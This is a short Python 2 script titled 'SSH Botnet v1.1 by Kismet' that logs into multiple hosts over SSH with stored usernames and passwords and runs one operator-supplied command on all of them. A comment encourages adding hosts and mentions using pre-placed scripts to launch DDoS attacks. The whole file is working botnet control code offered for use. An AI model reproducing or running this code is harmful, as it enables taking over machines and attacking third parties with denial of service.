import pxssh

print("        __                __        ")
print(".-----.|  |_.--.--.-----.|__|.-----.")
print("|  _  ||   _|  |  |  _  ||  ||  -__|")
print("|__   ||____|___  |   __||__||_____|")
print("   |__|     |_____|__|              ")
print("									   ")
print("      SSH Botnet v1.1 by Kismet     \n")

cmd = raw_input("[!] What command would you like the send: ")

class Client:

    def __init__(self, ip, user, password):
        self.ip = ip
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.ip, self.user, self.password)
            return s
        except Exception, e:
            print e
            print '[!] Error Connecting'

    def send_command(self, cmd):
        self.session.sendline(cmd)
        self.session.prompt()
        return self.session.before

def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print '[*] Output from ' + client.ip
        print '[+] ' + output 

def addClient(ip, user, password):
    client = Client(ip, user, password)
    botNet.append(client)

botNet = []

# you can add more by adding: addClient('ip', 'user', 'passwd')

addClient('127.0.0.1', 'root', 'root')

# Make sure you have those scipts on the servers if you wish the exec some DDoS ;)

botnetCommand(cmd)
